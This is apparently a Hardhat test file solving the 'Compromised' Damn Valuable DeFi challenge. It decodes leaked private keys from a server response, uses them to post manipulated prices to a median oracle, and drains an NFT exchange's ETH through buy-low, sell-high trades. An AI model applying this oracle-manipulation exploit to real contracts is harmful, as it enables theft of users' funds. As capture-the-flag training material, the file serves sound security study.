const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        //Initialize balance of the trusted source addresses
        //from https://hardhat.org/hardhat-network/reference/
        //hardhat_setBalance = Modifies the balance of an account.
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH -> ethers.utils.parseEther("2").toHexString()
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );
        /* from TrustfulOracleInitializer.sol
        .oracle() is function that deploy TrustfulOracle from TrustfulOracleInitializer
        "oracle = new TrustfulOracle(sources, true);"
        which call constructor(address[] memory sources, bool enableInitialization) {..}
        Inside constructor set up role "TRUSTED_SOURCE_ROLE" for source[i]
        This role is required for calling the postPrice() function that allows updating a symbol's price.
        and "INITIALIZER_ROLE" for TrustfulOracleInitializer.

        and then call function inside TrustfulOracle contract "setupInitialPrices()"
        which is  utility allowing the deployer to setup initial prices (only once) 
        "oracle.setupInitialPrices(sources, symbols, initialPrices);"
        */

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });
    /*
    it need to attach address of this.exchange.token() because inside Exchange contract 
    at constructor have token = new DamnValuableNFT(); for deploy DamnValuableNFT contract
    we send msg.value = EXCHANGE_INITIAL_ETH_BALANCE because Exchange constructor payable
    Since we're supposed to drain all ether from this contract, 
    we'll likely need to use sellOne() in Exchange contract as part of the exploit.

    The problem give
    While poking around a web service of one of the most popular DeFi projects in the space, 
    you get a somewhat strange response from their server. This is a snippet:
    HTTP/2 200 OK
          content-type: text/html
          content-language: en
          vary: Accept-Encoding
          server: cloudflare

          4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

          4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
    
    Use https://www.utilities-online.info/hex-to-ascii
    Outout1: 
    MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
    Output2:
    MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
    Use https://www.base64decode.org/
    Output1:
    0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
    Output2:
    0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
    Use https://eth-toolbox.com/
    At Keys Pipeline, put decoded base64 into private key input
    Output1 match ETH address: 0xe92401a4d3af5e446d93d11eec806b1462b39d15
    Output2 match ETH address: 0x81a5d6e50c214044be44ca0cb057fe119097850c

    Since we have private key of two sources that has role "TRUSTED_SOURCE_ROLE"
    we are able to postPrice() for buy cheap and sell high
    */

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        // load wallet/signer from Private Key
        const privKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const source1 = new ethers.Wallet(privKey1, ethers.provider);

        const privKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
        const source2 = new ethers.Wallet(privKey2, ethers.provider);

        // Set NFT median price to 1 wei.
        await this.oracle.connect(source1).postPrice("DVNFT", 1);
        await this.oracle.connect(source2).postPrice("DVNFT", 1);

        console.log("Balance before manipulate price buy/sell");
        console.log("Exchange balance:" + (ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address))).toString());
        console.log("Attacker balance:" + (ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString());

        // Buy 1 NFT for 1 wei,attacker starts with 0.1 ETH in balance ->left 0.09 ETH
        await this.exchange.connect(attacker).buyOne({value: 1});

        console.log("After buy");
        console.log("Exchange balance:" + (ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address))).toString());
        console.log("Attacker balance:" + (ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString());
    
        // Set NFT median price to 9999 ether + 1 wei to completely drain all.
        //(because we just give to exchange 1 wei),so + 1
        await this.oracle.connect(source1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(1));
        await this.oracle.connect(source2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(1));

        // Sell NFT ID #0 for 9999 ether + 1 wei to completely drain.
        await this.nftToken.connect(attacker).approve(this.exchange.address, 0)
        await this.exchange.connect(attacker).sellOne(0);
        /*
        DamnValuableNFT contract inherit from ERC721 in openzeppelin
        function approve(address to, uint256 tokenId) public virtual override {...}
        it need to approve because sellOne have condition
        "require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");"
        */
        console.log("After sell");
        console.log("Exchange balance:" + (ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address))).toString());
        console.log("Attacker balance:" + (ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString());

        // Reset price to initial 999 ether.
        await this.oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await this.oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE);


    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
